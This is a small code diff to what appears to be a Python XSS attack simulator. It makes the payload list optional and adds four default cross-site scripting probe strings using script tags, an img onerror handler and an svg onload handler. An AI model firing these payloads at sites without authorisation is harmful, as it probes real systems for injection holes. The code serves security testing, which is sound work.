@@ -53,10 +53,15 @@ DEFAULT_PAYLOADS = [
 class XSSAttack:
     """XSS attack simulator."""
 
-    def __init__(self, url: str, param: str, payloads: list[str], verbose: bool = False):
+    def __init__(self, url: str, param: str, payloads: list[str] | None = None, verbose: bool = False):
         self.url = url
         self.param = param
-        self.payloads = payloads
+        self.payloads = payloads if payloads is not None else [
+            "<script>alert('xss')</script>",
+            "<img src=x onerror=alert('xss')>",
+            "'\"><script>alert(1)</script>",
+            "<svg onload=alert(1)>",
+        ]
         self.verbose = verbose
         self.attempts = 0
         self.found_vulnerabilities = []
